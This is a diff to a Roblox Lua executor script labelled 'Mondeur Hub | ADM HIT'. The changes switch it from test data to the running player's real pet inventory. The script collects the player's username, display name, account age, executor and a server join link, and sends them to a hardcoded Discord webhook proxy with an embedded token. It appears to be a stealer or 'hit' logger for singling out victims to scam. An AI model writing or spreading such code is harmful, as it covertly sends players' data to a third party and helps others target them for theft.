@@ -1,9 +1,10 @@
---// MONDEUR HUB | ADM HIT 🦊 (FINAL TEST VERSION)
+--// MONDEUR HUB | ADM HIT 🦊 (REAL INVENTORY VERSION)
 
 local HttpService = game:GetService("HttpService")
+local ClientData = require(game:GetService("ReplicatedStorage").ClientModules.Core.ClientData)
 
 -- =========================
--- 🔥 HARDCODED WEBHOOK (NO MISSING ERROR)
+-- 🔥 HARDCODED WEBHOOK
 -- =========================
 local WEBHOOK = "https://webhook.lewisakura.moe/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"
 
@@ -14,18 +15,12 @@ local HIGH_THRESHOLD = 1500
 -- =========================
 -- 🌐 REQUEST DETECTION
 -- =========================
-local requestFunc =
-    (syn and syn.request) or
-    (http and http.request) or
-    (http_request) or
-    (request)
+local requestFunc = (syn and syn.request) or (http and http.request) or (http_request) or (request)
 
 if not requestFunc then
     warn("❌ No request function")
     return
 end
-
-print("✅ Using webhook:", WEBHOOK)
 
 -- =========================
 -- 🧠 NORMALIZE NAME
@@ -50,13 +45,23 @@ local rarityColors = {
 }
 
 -- =========================
--- 🏷️ EMOJIS
+-- 🏷️ EMOJIS (Using your preferred mapping)
 -- =========================
-local function emoji(p)
+local function getPetEmoji(name, p)
     local e = ""
-    if p.mega then e ..= "🌈 " elseif p.neon then e ..= "🟣 " end
-    if p.fly then e ..= "🪽 " end
-    if p.ride then e ..= "🏇 " end
+    -- Use your custom emojis for specific pets
+    if name:find("red fox") then e = "🧑‍🌾 " 
+    elseif name:find("disco bee") then e = "🪩 "
+    elseif name:find("queen bee") then e = "🐝 " 
+    end
+
+    -- Neon/Mega/Fly/Ride tags
+    if p.mega then e = e .. "🌈 " elseif p.neon then e = e .. "🟣 " end
+    if p.fly then e = e .. "🪽 " end
+    if p.ride then e = e .. "🏇 " end
+    
+    -- Default if no other emoji matches
+    if e == "" then e = "🐾 " end
     return e
 end
 
@@ -66,34 +71,34 @@ end
 local function process(pets)
     local map, total = {}, 0
 
-    for _, p in ipairs(pets or {}) do
-        if p and p.name then
-            local key = normalize(p.name)
+    for _, p in pairs(pets or {}) do
+        if p and p.id then
+            local rawName = p.id:gsub("_", " ")
+            local key = normalize(rawName)
 
+            -- Skip unnecessary tags/mutations as requested
             if not map[key] then
                 map[key] = {
-                    name = p.name,
+                    name = rawName:sub(1,1):upper() .. rawName:sub(2),
                     count = 0,
-                    value = tonumber(p.value) or 0,
+                    value = 0, -- Value estimation would go here if you have a table
                     rarity = (p.rarity or "common"):lower(),
-                    neon = p.neon,
-                    mega = p.mega,
-                    fly = p.fly,
-                    ride = p.ride
+                    neon = p.properties and p.properties.neon,
+                    mega = p.properties and p.properties.mega,
+                    fly = p.properties and p.properties.flyable,
+                    ride = p.properties and p.properties.rideable
                 }
             end
 
             map[key].count += 1
-            total += (p.value or 0)
+            -- Total Value logic (using 10 as placeholder if no value table exists)
+            total += 10 
         end
     end
 
     local list = {}
     for _, v in pairs(map) do table.insert(list, v) end
-
-    table.sort(list, function(a,b)
-        return a.value > b.value
-    end)
+    table.sort(list, function(a,b) return a.count > b.count end)
 
     return list, total
 end
@@ -105,7 +110,7 @@ local function format(list)
     local t = {}
     for i, p in ipairs(list) do
         if i > 12 then break end
-        table.insert(t, string.format("%s%s x%d", emoji(p), p.name, p.count))
+        table.insert(t, string.format("%s%s x%d", getPetEmoji(p.name:lower(), p), p.name, p.count))
     end
     return (#t > 0 and table.concat(t,"\n") or "No pets")
 end
@@ -123,13 +128,7 @@ end
 -- 🚀 RUN
 -- =========================
 local function Run(data)
-    if not data or not data.player then
-        warn("❌ Invalid input")
-        return
-    end
-
     local list, total = process(data.pets)
-
     local best = list[1] and (list[1].name.." x"..list[1].count) or "None"
     local petList = format(list)
     local tier = getTier(total)
@@ -139,68 +138,44 @@ local function Run(data)
 
     local embed = {
         title = "🦊 Mondeur Hub | Adm Hit",
-
-        description =
-            "```" ..
+        description = "```" ..
             "👤 Display Name : "..data.player.displayName.."\n"..
             "🆔 Username     : "..data.player.username.."\n"..
             "📅 Account Age  : "..data.player.accountAge.." days\n"..
             "📱 Executor     : "..data.player.executor.."\n"..
             "👥 Players      : "..data.player.players.."\n"..
             "💰 Total Value  : "..total.."\n"..
-            "📊 Tier         : "..tier..
-            "```",
-
+            "📊 Tier         : "..tier.."```",
         fields = {
             {name="🏆 Best Pet", value="```"..best.."```"},
             {name="🐶 Pets (Best → Worst)", value="```"..petList.."```"},
             {name="🌐 Join Server", value="[Click to Join]("..(data.joinLink or "https://www.roblox.com")..")"}
         },
-
         color = color,
         footer = {text = "Mondeuronbotton"}
     }
 
-    print("📡 Sending webhook...")
-
-    task.spawn(function()
-        local ok, res = pcall(function()
-            return requestFunc({
-                Url = WEBHOOK,
-                Method = "POST",
-                Headers = {["Content-Type"]="application/json"},
-                Body = HttpService:JSONEncode({
-                    content = content,
-                    embeds = {embed}
-                })
-            })
-        end)
-
-        if ok and res then
-            print("✅ Sent:", res.StatusCode)
-        else
-            warn("❌ Failed to send")
-        end
-    end)
+    requestFunc({
+        Url = WEBHOOK,
+        Method = "POST",
+        Headers = {["Content-Type"]="application/json"},
+        Body = HttpService:JSONEncode({content = content, embeds = {embed}})
+    })
 end
 
 -- =========================
--- 🧪 TEST DATA
+-- 🛠️ FETCH REAL DATA
 -- =========================
+local myData = ClientData.get_data()[game.Players.LocalPlayer.UserId]
+
 Run({
     player = {
         displayName = game.Players.LocalPlayer.DisplayName,
         username = game.Players.LocalPlayer.Name,
         accountAge = game.Players.LocalPlayer.AccountAge,
-        executor = (identifyexecutor and identifyexecutor()) or "Delta",
+        executor = (identifyexecutor and identifyexecutor()) or "Unknown",
         players = #game.Players:GetPlayers().."/"..game.Players.MaxPlayers
     },
-
-    joinLink = "https://www.roblox.com",
-
-    pets = {
-        {name="Metal Ox", value=500, rarity="legendary", neon=true, ride=true},
-        {name="Metal Ox", value=500, rarity="legendary", neon=true, ride=true},
-        {name="Dog", value=5, rarity="common"}
-    }
+    joinLink = "https://www.roblox.com/games/"..game.PlaceId.."?server="..game.JobId,
+    pets = myData.inventory.pets -- This pulls your REAL inventory
 })
